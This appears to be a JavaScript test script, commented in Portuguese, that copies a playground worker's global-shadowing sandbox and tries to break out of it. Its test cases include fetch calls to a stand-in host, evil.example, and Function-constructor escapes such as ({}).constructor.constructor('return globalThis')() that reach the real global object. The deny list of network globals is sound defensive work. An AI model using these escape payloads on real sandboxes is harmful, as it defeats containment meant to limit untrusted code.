// Reproduz a técnica de sombreamento de globais de apps/playground/workers/runner.worker.ts:64-77
// (new Function com parâmetros "bloqueados") e tenta escapar pelo construtor de Function.
const negado = () => { throw new Error('Acesso negado'); };
const blocked = new Proxy(negado, { get: negado, apply: negado, construct: negado });
const DANGEROUS = ['self', 'globalThis', 'fetch', 'XMLHttpRequest', 'WebSocket', 'importScripts', 'indexedDB', 'caches', 'Worker', 'SharedWorker', 'EventSource'];
const stub = { log: () => {}, warn: () => {}, error: () => {}, info: () => {}, debug: () => {} };
function run(code) {
  const fn = new Function('console', ...DANGEROUS, `"use strict"; ${code}`);
  try { return fn(stub, ...DANGEROUS.map(() => blocked)); } catch (e) { return 'BLOQUEADO: ' + e.message; }
}
const cases = {
  'fetch direto (o que o E2E testa)': 'fetch("https://evil.example/x")',
  'self.fetch': 'self.fetch("https://evil.example/x")',
  'escape via construtor de arrow function': 'return typeof (()=>{}).constructor("return globalThis")().fetch',
  'escape via AsyncFunction': 'return typeof (async()=>{}).constructor("return globalThis")().fetch',
  'escape via Function do prototype de objeto': 'return typeof ({}).constructor.constructor("return globalThis")().fetch',
  'import() dinamico': 'return typeof import',
};
for (const [k, code] of Object.entries(cases)) {
  let out;
  try { out = run(code); } catch (e) { out = 'ERRO ' + e.name + ': ' + e.message; }
  console.log(k.padEnd(48), '=>', String(out));
}
